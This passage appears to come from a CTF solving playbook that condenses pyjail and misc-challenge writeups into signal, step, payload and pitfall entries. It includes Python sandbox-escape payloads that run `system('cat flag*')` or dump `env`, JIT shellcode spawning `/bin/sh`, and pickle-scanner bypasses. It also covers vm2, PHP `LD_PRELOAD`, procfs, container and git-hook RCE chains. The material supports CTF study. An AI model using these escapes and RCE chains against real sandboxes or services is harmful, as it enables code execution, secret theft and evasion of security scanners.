- Pitfall: `%` formatting with a SINGLE value needs no tuple, with 2+ needs `(a,b)` — parens may be banned, so prefer chained single-`%c` concats there.
- Sources: https://jia.je/ctf-writeups/2025-08-16-scriptctf2025/modulo.html
### W27. Blind boolean oracle (div-zero + OOB-index)
- Signals: try/except swallows output, distinct `error` vs `ok` messages, `ord`/`flag` left in scope.
- Steps: 1) `True//(ord(flag[I])-GUESS)` — exception IFF guess correct; 2) or `[True]*GUESS…[ord(flag[I])]` — OOB exception IFF guess wrong (invert to fit message polarity); 3) loop positions × printable range inside the 200-round cap; keep charset ≤ cap via W6 spellings.
- Payload: `True//(ord(flag[True+True])-(True+…))` per (pos,guess).
- Pitfall: message polarity flips between jails (`error`-on-zero vs `ok`-on-survive) — calibrate with a KNOWN char (e.g. `flag[0]=='f'`-family) before the loop.
- Sources: https://jia.je/ctf-writeups/misc/pyjail/imaginaryctf-2024-ok-nice.html, https://www.ctfiot.com/195241.html
### W28. stderr-channel exfil (stdout-closed jails)
- Signals: stdout closed/muted, stderr open; `open()` readable; direct `print` impossible.
- Steps: 1) `exit(set(open('flag.txt')))` / `exit(*open('flag.txt'))` — set-print goes to stderr; 2) or `help(*open('flag.txt'))` pager; 3) or `compile('.','flag','exec')` stderr leak; 4) compile+exec with closed fds → Popen-to-stderr variant (W-ACS-style).
- Payload: pick ONE per local rehearsal with fds closed the same way.
- Pitfall: `set()` ordering scrambles multi-line flags — prefer `*`-splat or `help()` which preserve order.
- Sources: https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md, https://github.com/jailctf/pyjail-collection
### W29. Module-attr RCE via format/file-write + ctypes-cdll
- Signals: exotic-but-imported modules (numpy), `str.format` sink, or arbitrary file write + ctypes.
- Steps: 1a) `numpy.genfromtxt`-style loader abuse where present; 1b) `inp.format()`-driven attribute plant + file write → `ctypes.cdll[path]` getitem load; 2) escalate to `os.system`-equivalent only after the load primitive is proven with `id`-level benign command.
- Payload: per-module (no universal one-liner — build against the imported names in `jail.json`).
- Pitfall: version-pinned loader semantics — confirm the loader EXISTS in the remote numpy/build before writing the chain.
- Sources: https://github.com/jailctf/pyjail-collection/blob/main/chals/paper-viper, https://github.com/jailctf/pyjail-collection
### W30. zipimporter .py-as-zip confusion
- Signals: uploaded `.py` executed in an environment that sniffs ZIP magic first.
- Steps: 1) craft file valid as BOTH zip archive and python source; 2) zipped payload's import path shadows the visible `.py`; 3) behavior diverges `python file.py` vs import — exploit the imported copy.
- Payload: per-layout (no generic bytes — build with `zipfile` + source-prefix comment tricks, verify both parses locally).
- Pitfall: central-directory-at-EOF means leading source bytes are fine, but STORE vs DEFLATE changes offsets — test extraction with BOTH `unzip -l` and `7z l`.
- Sources: https://github.com/jailctf/pyjail-collection
### W31. Befunge golf under char/PC limits
- Signals: befunge runner, flag pre-pushed on stack, ≤16-char budget, possibly no PC-manipulation ops.
- Steps: 1) drain-loop `>,<` when PC ops allowed; 2) else `_`-oscillator `0_0..1_` printing two ASCII codes per swing; 3) shrink per tighter budgets (befuddled3 = same shape, fewer chars).
- Payload: `>,<` or `0_0..1_` adapted to the allowed alphabet.
- Pitfall: `.` prints INTEGER code, `,` prints CHAR — mixing them garbles the flag; check which the checker expects.
- Sources: https://ctftime.org/writeup/38832, https://ctftime.org/writeup/38833, https://ctftime.org/writeup/38834
### W32. Brainfuck-JIT unterminated-loop call confusion
- Signals: bf→native JIT in Python, loop-stack (`jumps` array) with `-1` placeholder.
- Steps: 1) open `[` never closed → jump stays `-1` → lands on `0xff` byte; 2) precede with many `<` so emitted `sub r8,len` bytes reinterpret `ff 49 81 e8…` as `dec [rcx-0x7f]; call <len>`; 3) pad code with `.` to position near RWX data zone holding `execve(/bin/sh)` shellcode; 4) `rcx` is syscall return address (writable) at decode time.
- Payload: `b'.'*0x700 + shellcode-via(+/>) + b'.['+b'<'*OFFSET`.
- Pitfall: OFFSET is layout-specific (0xe2a in the reference) — recompute from YOUR `pwn disasm` of the emitted bytes, never reuse.
- Sources: https://ctftime.org/writeup/37453
### W33. Whitespace-variant VM triage
- Signals: `cat -A` shows only space/tab/newline (plus NBSP/CR/VT/FF variants); huge inputs; sleeps per instruction.
- Steps: 1) `cat -A` + byte-histogram to fix the TRUE alphabet (reference VM used ` \t\n NBSP \r \x0B` with distinct ops); 2) map ops (inc/dec/move/push/xor/reset); 3) if a `sleep(10ms)`-style throttle exists, patch the binary sleep (pwntools `elf.write`) rather than reimplementing; 4) never run 300MB+ inputs through web interpreters.
- Payload: patched-binary run + game-win path, not a hand-decoded flag.
- Pitfall: stock whitespace interpreters FAIL on variant alphabets — a failed trivial-program test means variant-VM (A4-route), not a broken input.
- Sources: https://libbabel.so/writeups/csaw-quals-2025/whitespace-compiler/, https://ctfpal.com/tools/brainfuck-interpreter
### W34. PoW nonce-reuse + array-amplify + hashcash CLI
- Signals: `sha256(prefix+nonce)` leading-zero gate, or `hashcash` banner line, before the real service.
- Steps: 1) parse algo/prefix/target/charset into `pow.json`; 2) find ONE valid nonce (local brute or `hashcash -mC -b <bits> <res>`); 3) if server scores arrays per-element, replay the SAME nonce in bulk arrays (50k–100k per request, 429-backoff); 4) only then start the quiz loop.
- Payload: `hashcash -mCb26 "$challenge"` or `solve_pow(prefix,zeros)` stub, then bulk-replay script.
- Pitfall: array caps (`invalid body` over N) and rate limits (429) — binary-search the max array size once, then pipeline below it.
- Sources: https://cryptocat.me/blog/ctf/2024/wani/web/pow/, https://github.com/ECSC2024/ECSC2024-CTF-Jeopardy/blob/main/pwn03/checker/__main__.py
### W35. QR-shuffle reassembly + finder-repair
- Signals: QR split/shuffled with accompanying shuffle script, or QR missing finder patterns.
- Steps: 1) shuffled-grid: brute re-permutations with `pyzbar.decode` validity as the oracle (3x3 = 9! worst case — use the provided script's own RNG to narrow); 2) finder-stripped: transplant three finders from a complete QR of the same version via image edit, then decode; 3) rMQR (long-rectangle): switch reader app (plain zbar fails the variant).
- Payload: `for perm in search: img=reassemble(perm); decode(img)` loop.
- Pitfall: version/quiet-zone mismatch after transplant — keep module-grid alignment exact or decode fails silently.
- Sources: https://ctftime.org/writeup/39113, https://jishuzhan.net/article/1786641986447478785, https://twc1rcle.com/ctf/team/ctf_writeups/nahamcon_2024/warmup/QRRRRRRRR
### W36. CRC-known-plaintext + single-byte zip ladder
- Signals: nested zips with 1-byte passwords, CRC-mismatch errors, or ZipCrypto-STORE entries.
- Steps: 1) `unzip -l`/`7z l` first; fix header lies (filename-length/compression-method) with `010`-style edits when CRC errors appear; 2) single-byte passwords: brute 0..255 per layer, collecting each layer's byte as the NEXT artifact (320-deep ladders feed an AES-ECB key); 3) ZipCrypto-STORE + known plaintext → `bkcrack` instead of brute; 4) tiny-file CRCs → `zlib.crc32` brute only.
- Payload: per-layer `pyzipper.AESZipFile` loop with `long_to_bytes(pwd)` + hex-key accumulation.
- Pitfall: key ORDER (ladder is often reversed — `key[::-1]`) and hex-vs-raw key forms — confirm with the first successful AES trial before unwinding all 320.
- Sources: https://luoingly.top/post/isctf-2023-misc-writeup/, https://goodlunatic.github.io/posts/067cfbd/
## Writeup-Distilled Patterns R2 (W37..W66) — index (bodies in techniques/)
Mined from 414 NEW hard writeups (see `knowledge/writeups_mined/misc-pyjail_manifest_r2.md`,
zero URL overlap with R1). Each row: signals → steps → payload → pitfalls → body file.
### W37. sys.monitoring hook jails
- Signals `sys.monitoring`+BRANCH/CALL kill-hook → prologue rebinds `_exit` in `__main__` dict BEFORE any call, then `print(open(...))`; alt environ-BROWSER/antigravity.
- Pitfall: any CALL before the rebind kills the process — order is everything. | techniques/writeup-patterns-r2-1.md
### W38. RestrictedPython / container-module jails
- Signals `RestrictedPython`/battlecode allowlist → enumerate `dir(enum)` for leaked `sys`, pivot `enum.sys`→`sys.modules["os"]`; Julia AST jails → overload exposed operators.
- Pitfall: allowlists are API-chosen, not hygiene-chosen — enumerate, never assume. | techniques/writeup-patterns-r2-1.md
### W39. Audit-hook neutered-after-eval + repr smuggle
- Signals hook-disabled-before-`print` + `match`-prefix gate + `<=75`/no-space → `0,`-prefix + `type('',(),{'\x5f\x5frepr\x5f\x5f':...})()` read in `__repr__`.
- Pitfall: `0or` parses as octal (use `0,`); target `__repr__`, not `__str__`. | techniques/writeup-patterns-r2-1.md
### W40. 3.14 subinterpreter + setresuid jails
- Signals `interpreters`+`syscall(117,nobody)` → breakpoint, then ctypes int-rewrite 117→106, or cross-interpreter pickle-`__reduce__` smuggle, or pdb+SIGUSR1 reader (drop is per-thread).
- Pitfall: match the PoC to YOUR filter set (pdb vs ctypes vs signal). | techniques/writeup-patterns-r2-1.md
### W41. NFKC no-parens operator-overwrite jails
- Signals NFKC+`._`/parens/quotes/operators bans → `{0 for help.__class__.__invert__ in {input}}` then `~help`; walrus `{print:=exec}`+`and`-chain second stage.
- Pitfall: walrus can't nest — use `for`-binders; `.\t_` passes the `._` check. | techniques/writeup-patterns-r2-1.md
### W42. No-output exfil (stderr / exit-status / panic)
- Signals closed-stdout/`flag`-in-scope, Rust whitelist, allowlist-audit → `{}[flag]` KeyError-to-stderr; `_posixsubprocess`+`waitpid` byte-per-run; `process::exit(byte)`/`panic_any(string)`.
- Pitfall: budget one probe per byte; `set()` scrambles — prefer splat/`help()`. | techniques/writeup-patterns-r2-1.md
### W43. Compiler/service-as-reader jails
- Signals input to `asm`/`g++`/`dc`/bash → `.incbin "flag.txt"`; dc `!`/`?`/`a`/`x`; C++ `goto *`+`extern`+`sizeof` (or `movabs` shellcode); bash `$1`/`$_` slicing+`${IFS}`.
- Pitfall: directives resolve at SERVICE cwd — list first; recompute OOB per binary. | techniques/writeup-patterns-r2-1.md
### W44. Grammar-shaped pyjails (budgets)
- Signals charset/length/occurrence caps → one spelling per token: lambda-getter (1 dot), `\xXX`+`__len__` (prime words), `[v][000…]` (collatz), `len=all` (≤5 exec), `\x65` (no-e), tab/quote alternation (parity).
- Pitfall: measure the WIRE form; never stack evasions — one per blocked token. | techniques/writeup-patterns-r2-1.md
### W45. Scanner-differential pickles
- Signals scan-then-`loads` (modelscan/picklescan/fickling) → hide opcodes past the scanned prefix; NEWOBJ-only `tuple(map(pty.spawn,…))` vs REDUCE-flagging; polyglot the container; pin scanner version.
- Pitfall: bypasses are scanner-version-specific — test the PINNED version. | techniques/writeup-patterns-r2-1.md
### W46. Pickle opcode-confusion + oracles
- Signals custom `find_class`/length games → `B+1=C` (or `0xfe+1 mod 0xff`) second-program flip; `}`-as-empty-dict + `name in players` byte oracle; C/Python/pickletools triple brute-force (≤8 B).
- Pitfall: `\x10` truncates stdin reads; always `pickletools.dis` YOUR bytes. | techniques/writeup-patterns-r2-1.md
### W47. JS sandbox jails
- Signals Proxy grammars/vm2+CVE-version/lodash-`set`/merge endpoints → method-name char synthesis to Function; version-matched PoC via JSFuck; `constructor.prototype` pollution + replay; Proxy-get/callee-require chains.
- Pitfall: vm2 PoCs are minor-fragile; some jails `exit(1)` on `Function` — smuggle it. | techniques/writeup-patterns-r2-1.md
### W48. Lua load-bytecode smuggling
- Signals lupa/`load`-aliased sandboxes, game scripts, wasmoon → `string.dump` an `os.execute` chunk through the exposed loader; exfil via in-VM channels; WASM type-confusion → fake-closure indirect call.
- Pitfall: chunks are runtime-specific (5.1/5.2/5.4/WASM differ) — build for TARGET. | techniques/writeup-patterns-r2-1.md
### W49. Ruby/Perl/Raku/OCaml stripped jails
- Signals AST-opcode bans, `perl -e` length gates, Raku charset EVAL, nulled OCaml Stdlib → `send`/`class_eval`+octal strings; `die %ENV`/`die%ENV`; Raku xor-staging; OCaml `external … = "caml_*"` C-primitive rebuild.
- Pitfall: `$SAFE`/Safe.pm are advisory — attack the opmask, not the docs. | techniques/writeup-patterns-r2-1.md
### W50. JVM / expression-language jails
- Signals Java word-blacklists, ASM hints, `${}`/JEXL/SpEL sinks, CNN-gated compile → reflection+concat paths; offline condy classgen; `new ()`/socket-staged SpEL; double-eval EL error leaks; adversarial comments + ignorable code points, then `getDeclaredFields0` manager-null.
- Pitfall: EL dialects differ — fingerprint first; never pad blindly past softplus weights. | techniques/writeup-patterns-r2-1.md
### W51. Deno/Bun + validator-gap jails
- Signals Deno perms/`Bun.$`/TS writes/Emacs native-compile → symlink/chdir TOCTOU + `/proc/self/cwd` confusion + mem-patch; Bun header-`eval` + PID-delta oracle; nullbyte+tsconfig-remap+crash-restart; compiler-macro (`featurep`) or FILENAME (`"/flag.txt"`) reads pre-validation.
- Pitfall: offsets version-pinned; PID oracles need quiet per-team instances. | techniques/writeup-patterns-r2-1.md
### W52. PHP eval-sandbox + disable_functions
- Signals layered escape-filters, giant `disable_functions`, `mail`/`putenv` alive, `create_function` → quoteless `chr(count(array(null…)))`+`implode(file())`; `}`-breakout+XOR names; `LD_PRELOAD`+`mail`/`proc_open`/procfs-PLT; curl-`file://` for `open_basedir`; `glob("fl*txt")` reads.
- Pitfall: `mail()` without sendmail hangs; variable-functions dodge `\bfunc\s*\(` regexes. | techniques/writeup-patterns-r2-2.md
### W53. Regex / DFA oracles
- Signals user-regex-vs-secret+timeout, 1-char edits, 5s synthesis rounds, golf boards → ReDoS-timing (`(?=.{i}$)`+char), regex-cache pinning (`/o`), constraint-parser+`fullmatch` synthesis, remainder-DFA+state-elimination, PCRE recursion golf.
- Pitfall: cap probes (you can DoS yourself); cache pins on FIRST compile — go first. | techniques/writeup-patterns-r2-2.md
### W54. Git-object puzzles
- Signals patch inputs, submodule configs, `rev-list` flows, corrupt packs → patch edits the CHECKED file; nested-submodule `fsmonitor`/hook RCE; SHA-named branch beats hash at checkout; `verify-pack`+`cat-file` carving; dumb-protocol + compare-view recovery.
- Pitfall: submodule behavior is version-specific — verify locally first. | techniques/writeup-patterns-r2-2.md
### W55. procfs / sysfs / container escapes
- Signals filename+offset writes, RO-fs+writable-/proc, deleted flags, nsjail+PIDs, postgres PROGRAM → `/proc/self/mem` loop-patch+GOT; maps+ranged reads; mem-shellcode+`memfd_create`+setuid-`.so`+`core_pattern` breakout; disk-mount via DB.
- Pitfall: mem writes need seeks+mapped addrs (parse `maps`); crashes need host handlers. | techniques/writeup-patterns-r2-2.md
### W56. eBPF verifier-confusion + probe jails
- Signals custom helpers, patched verifiers, dumped progs/maps, killer probes, backdoor hints → find the verifier lie (readonly-written args, 32/64 min-max), UAF-map races, unhooked-helper paths, `bpftool`-dump trigger reversing (XOR'd strings).
- Pitfall: bugs are kernel-version-pinned — match EXACT `v6.x.y`. | techniques/writeup-patterns-r2-2.md
### W57. Chess-engine trust exploits
- Signals stockfish/python-chess, client eval reports, mate-UI gates, `/api/move` → null-move side-swap; newline-UCI `Debug-Log-File` write→SSTI; self-reported eval; direct move POST; settings-merge pollution for sequel gates.
- Pitfall: fake-flag chats mean the real flag is elsewhere — read the Dockerfile first. | techniques/writeup-patterns-r2-2.md
### W58. Minesweeper / slots / hash-grind games
- Signals socket minesweepers, balance-target slots, sha-prefix wins, ZK color games → linearize+sparse-solve (or XSLeaks/seed-reuse); RNG cloning (MT128-OCR/ChaCha-0/timestamp/XORShift-z3) or +EV farming; lowest-hash mining; commitment type-confusion+pipelining.
- Pitfall: OCR needs error-correction; farming needs a bankroll cap. | techniques/writeup-patterns-r2-2.md
### W59. CRC / checksum grinds
- Signals CRC16+CRC8 gates, CRC-framed servers, CAN logs, IHDR repairs → same-length collision brute-force (2^24-scale); zip-CRC content recovery; `gateway_proto` recompute; 1-byte secret brute-force; 4095² dimension match.
- Pitfall: length must match EXACTLY; `pngcheck` before brute-forcing. | techniques/writeup-patterns-r2-2.md
### W60. Rule-bot / scripted-service tricks
- Signals rendering chatbots, bandit hash games, merge endpoints, interview oracles → template syntax through the pipe; prefix-only (`match`) satisfaction + self-computed commits; `constructor.prototype` + replay; compare-view diffing.
- Pitfall: rule-bots only (LLM-bots are another skill); pipeline, don't sleep-loop. | techniques/writeup-patterns-r2-2.md
### W61. PoW gates + high-round solvers
- Signals `sha256(XXXX+suffix)` handshakes, hashcash banners, 1000-quiz loops → parse hex/bits + prefix/suffix precisely (4-char brute, not mining); hashcash CLI / stub with 120s cap; history-driven `solve.py` (200 rounds, 2 reconnects).
- Pitfall: 9/10 stalls are spec misreads — re-read the banner before scaling. | techniques/writeup-patterns-r2-2.md
### W62. QR repair + polyglot / document chains
- Signals damaged/shuffled/masked QR, MP4-sized PNGs, gzip-PDFs, quine dirs → QRazyBox+finder-transplant+Reed-Solomon; geometry inverses first; mask re-application; `file`+`xxd` every offset → carve → ffprobe → steghide; gzip-comment seams; run quines.
- Pitfall: transplant at wrong version never decodes — count timing modules first. | techniques/writeup-patterns-r2-2.md
### W63. Zip / bkcrack / nested-archive ladders
- Signals ZipCrypto-STORE, "uncrackable" 12-chars, `.7z` stages, disk images, duplicate-file triages → header-plaintext keys; Deflate `-mx0..9` matrix; inner-filename prediction; `-o/-x` partial plaintext; key→`--bruteforce ?p`; OneDrive/vmdk sourcing.
- Pitfall: `-c`/`-p` must align; Deflate needs the SAME level — matrix all 10. | techniques/writeup-patterns-r2-2.md
### W64. Esolang JIT / OOB + dialect golf
- Signals custom bf/befunge runtimes, RWX text, word-token dialects, `exec()`-outputs, char caps → OOB GOT walks (leak → strlen→system); int16 sign-flip jumps; base-tape golfed `exec(input())` loaders; token-maps; variant-alphabet histograms first.
- Pitfall: OOB offsets are per-binary; disassemble YOUR JIT bytes, never reuse. | techniques/writeup-patterns-r2-2.md
### W65. Blind measurement channels
- Signals print-less templates, redacted stdout, swallowing `except:`, prompt-counting → 1-char-cache ADDRESS oracle (`{0[N].__len__}` + `%4096` invariance + width-padding digit reads + no-op probes); censor-allowed-channel exfil; attack the CHECKER.
- Pitfall: find the length-preserving probe FIRST or the budget explodes. | techniques/writeup-patterns-r2-2.md
### W66. Arcade / puzzle-game + official sources
- Signals score-threshold minigames, official solves/repos, timestamp paths → board-as-memory play; timestamp→path recompute; threshold farming/state cheats; read `solution/writeup.md`+`solve.py` BEFORE scripting.
- Pitfall: check RNG reuse first; verify threshold math before "fair" play. | techniques/writeup-patterns-r2-2.md
`Reasoning Checkpoint`: R2-pattern evidence (which W37-W66 signals matched + body file) -> route (single R2 spelling, local-proof first) -> next (gated shot or escalate per triggers, no stacking).

## EASY-FIRST ladder (2026 training refresh — pyjail ≤20 min)
1. Probe: print `__builtins__`, version, and test each char `'"()._=` one at a time to map the filter.
2. No quotes → `chr(115)+chr(104)`; no dots → `getattr(x,'__cl'+'ass__')`; blacklist words → `'__imp'+'ort__'`, `"\x5f\x5f"`.
3. Walk `().__class__.__mro__[1].__subclasses__()` → find `_wrap_close` BY NAME (never hardcode index) → `__init__.__globals__['sy'+'stem']('cat flag*')`.
4. Need file read → `__import__('o'+'s').system('ls;cat flag*;env')` or `open('/flag*').read()` via the same globals.
5. Blind/no-output → length-probe channel first (`{0[N].__len__}` invariance), then exfiltrate one char at a time.

## R4 field patterns (browser-swarm 2026 — from 170 new writeups)
- NFKC normalization before blacklist: `ﬁ`→`fi`, fullwidth `ｏｐｅｎ` — enumerate with `unicodedata.normalize` over U+2000 range.
- Pickle BUILD-only: overwrite `license._Printer__setup` or `Unpickler.pop_mark` → `code.interact`, trigger via `print`.
- Single-dot reuse: `f=x.__getattribute__; f(f.__getattribute__)` chains without `a.b.c`.
- numpy smuggle: `genfromtxt` reaches dangerous attrs in "no-sandbox" jails.
- No-parens calls: `Cls.__class_getitem__` form + `@exec`/`@input` class trick + formfeed spaces.
- Div-zero oracle (`ok-nice` class): brute flag chars through zero-division side channel.

Deep-read bodies (15 complete articles): techniques/r5-deep-reads.md.
